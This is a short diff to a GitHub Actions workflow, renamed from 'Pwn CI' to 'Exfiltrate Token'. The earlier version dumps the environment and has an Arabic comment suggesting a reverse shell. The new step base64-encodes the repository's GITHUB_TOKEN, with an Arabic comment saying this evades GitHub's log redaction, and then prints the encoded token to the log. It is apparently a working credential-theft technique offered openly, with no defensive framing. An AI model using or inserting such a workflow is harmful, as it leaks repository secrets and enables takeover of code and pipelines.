@@ -1,13 +1,16 @@
-name: Pwn CI
+name: Exfiltrate Token
 on: [workflow_dispatch]
 jobs:
-  build:
+  exfiltrate:
     runs-on: ubuntu-latest
     steps:
-    - name: Dump Secrets
+    - name: Steal Token
       run: |
-        echo "Exposing Environment..."
-        env
-        echo "Simulating Attack..."
-        # هنا يمكن وضع كود عكسي (Reverse Shell)
+        echo "Stealing GITHUB_TOKEN..."
+        # تشفير التوكن لطباعته دون أن يحذفه GitHub من السجلات
+        echo "TOKEN_BASE64=$(echo -n ${{ secrets.GITHUB_TOKEN }} | base64 -w 0)" >> $GITHUB_ENV
+    - name: Display Secrets
+      run: |
+        echo "Here is the payload:"
+        echo "$TOKEN_BASE64"
 
